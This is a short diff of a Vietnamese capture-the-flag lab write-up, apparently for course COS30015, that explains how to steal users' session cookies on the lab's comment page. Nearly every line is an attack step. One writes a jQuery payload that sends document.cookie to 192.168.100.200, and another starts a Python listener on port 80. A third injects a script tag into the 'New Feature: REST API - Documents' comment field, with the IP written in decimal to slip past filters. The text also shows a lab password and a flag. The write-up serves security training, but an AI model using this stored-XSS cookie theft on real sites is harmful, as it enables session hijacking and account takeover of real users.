@@ -14,5 +14,5 @@ Flag <strong>OrganicShantyAbsent505</strong>
 -<strong>Cách lấy value session của người dùng.</strong> <br/>
 <code>-Nhập: echo "$.get('http://192.168.100.200?cookie=' +document.cookie);" > .j (vào terminal)</code> <br/>
 <code>-Mở server để lắng nghe: sudo python -m SimpleHTTPServer 80 (Terminal) (pass:COS30015user)</code> <br/>
-<code>-Nhập <q>[<script src=//3232261320/.j>](test5)</q> vào ô comment của New Feature: REST API - Documents và submit.(3232261320 là số thập phân của 192.168.100.200)</code> <br/>
+<code>-Nhập </code> [<script src=//3232261320/.j>](test5) <strong>(phần html ẩn script, đọc kỹ readme để thấy)</strong> <code>vào ô comment của New Feature: REST API - Documents và submit.(3232261320 là số thập phân của 192.168.100.200)</code> <br/>
 <code>-Đợi một lúc và chúng ta sẽ thấy một số session id nổi lên,thử hết chúng để lấy flag.</code> <br/>
